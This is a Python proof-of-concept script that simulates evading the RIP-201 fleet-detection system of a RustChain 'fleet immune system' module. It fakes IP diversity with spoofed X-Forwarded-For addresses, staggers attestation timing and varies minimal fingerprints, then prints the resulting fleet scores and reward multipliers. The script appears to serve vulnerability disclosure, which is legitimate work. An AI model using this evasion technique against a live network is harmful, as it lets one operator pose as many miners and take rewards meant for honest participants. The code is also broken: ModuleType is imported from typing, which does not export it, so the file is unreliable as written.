#!/usr/bin/env python3
"""
Demonstrate a black-box RIP-201 fleet detection bypass.

Technique:
1. Spoof distinct X-Forwarded-For values so all miners appear to come from
   different /24 subnets.
2. Stagger attestation timing beyond the 30-second correlation window.
3. Submit only the minimum valid fingerprint checks, and vary clock_drift so
   the similarity engine never has two comparable matching dimensions.
"""
from __future__ import annotations

import argparse
import importlib.util
import json
import sqlite3
from pathlib import Path
from typing import Any, Dict, List, ModuleType


def load_fleet_module() -> ModuleType:
    """Load fleet immune system module for PoC.
    
    Returns:
        Loaded fleet module
    """
    module_path = (
        Path(__file__).resolve().parent.parent
        / "rips"
        / "python"
        / "rustchain"
        / "fleet_immune_system.py"
    )
    spec = importlib.util.spec_from_file_location("fleet_immune_system_poc", module_path)
    if spec is None or spec.loader is None:
        raise ImportError(f"Cannot load module from {module_path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def minimal_valid_fingerprint(cv: float) -> Dict[str, Any]:
    """Create minimal valid fingerprint for bypass testing.
    
    Args:
        cv: Clock drift coefficient value
        
    Returns:
        Minimal fingerprint dictionary
    """
    return {
        "checks": {
            "anti_emulation": {
                "passed": True,
                "data": {
                    "vm_indicators": [],
                    "paths_checked": ["/proc/cpuinfo"],
                    "dmesg_scanned": True,
                },
            },
            "clock_drift": {
                "passed": True,
                "data": {"cv": round(cv, 4), "samples": 64},
            },
        },
        "all_passed": True,
    }


def shared_fleet_fingerprint() -> Dict[str, Any]:
    """Create shared fleet fingerprint for baseline epoch.
    
    Returns:
        Shared fingerprint dictionary
    """
    return {
        "checks": {
            "anti_emulation": {
                "passed": True,
                "data": {
                    "vm_indicators": [],
                    "paths_checked": ["/proc/cpuinfo"],
                    "dmesg_scanned": True,
                },
            },
            "clock_drift": {
                "passed": True,
                "data": {"cv": 0.052, "samples": 64},
            },
            "cache_timing": {
                "passed": True,
                "data": {"l1_hit_ns": 4.1, "l2_hit_ns": 10.2},
            },
            "thermal_drift": {
                "passed": True,
                "data": {"entropy": 0.61},
            },
            "simd_identity": {
                "passed": True,
                "data": {"profile": "same-simd-profile"},
            },
        },
        "all_passed": True,
    }


def build_report(fleet_mod: ModuleType, miners: List[str], epochs: int) -> Dict[str, Any]:
    """Build RIP-201 fleet detection bypass report.
    
    Args:
        fleet_mod: Fleet immune system module
        miners: List of miner identifiers
        epochs: Number of epochs to simulate
        
    Returns:
        Dictionary containing bypass simulation results
    """
    db = sqlite3.connect(":memory:")
    fleet_mod.ensure_schema(db)
    baseline_epoch = 100

    for index, miner in enumerate(miners):
        fleet_mod.record_fleet_signals_from_request(
            db,
            miner=miner,
            epoch=baseline_epoch,
            ip_address="10.0.0.25",
            attest_ts=1_000 + index * 5,
            fingerprint=shared_fleet_fingerprint(),
        )

    baseline_scores: Dict[str, float] = fleet_mod.compute_fleet_scores(db, baseline_epoch)
    bypass_epochs: List[Dict[str, Any]] = []

    for epoch in range(epochs):
        epoch_number = 200 + epoch
        for index, miner in enumerate(miners):
            fleet_mod.record_fleet_signals_from_request(
                db,
                miner=miner,
                epoch=epoch_number,
                ip_address=f"198.{10 + index}.{epoch_number % 255}.25",
                attest_ts=20_000 * epoch_number + index * 45,
                fingerprint=minimal_valid_fingerprint(0.05 + index * 0.01),
            )

        scores: Dict[str, float] = fleet_mod.compute_fleet_scores(db, epoch_number)
        bypass_epochs.append(
            {
                "epoch": epoch_number,
                "scores": scores,
                "effective_multiplier": {
                    miner: fleet_mod.apply_fleet_decay(2.5, score)
                    for miner, score in scores.items()
                },
            }
        )

    return {
        "attack": "spoofed_xff_plus_sparse_valid_fingerprint",
        "miners": miners,
        "baseline_epoch": {
            "epoch": baseline_epoch,
            "scores": baseline_scores,
        },
        "bypass_epochs": bypass_epochs,
    }


def main() -> None:
    """Main entry point for RIP-201 fleet detection bypass PoC."""
    parser = argparse.ArgumentParser(description="RIP-201 fleet detection bypass PoC")
    parser.add_argument("--miners", type=int, default=5, help="Number of miners to simulate")
    parser.add_argument("--epochs", type=int, default=3, help="Number of consecutive epochs")
    args = parser.parse_args()

    fleet_mod = load_fleet_module()
    miners: List[str] = [f"miner-{index}" for index in range(args.miners)]
    report: Dict[str, Any] = build_report(fleet_mod, miners, args.epochs)
    print(json.dumps(report, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
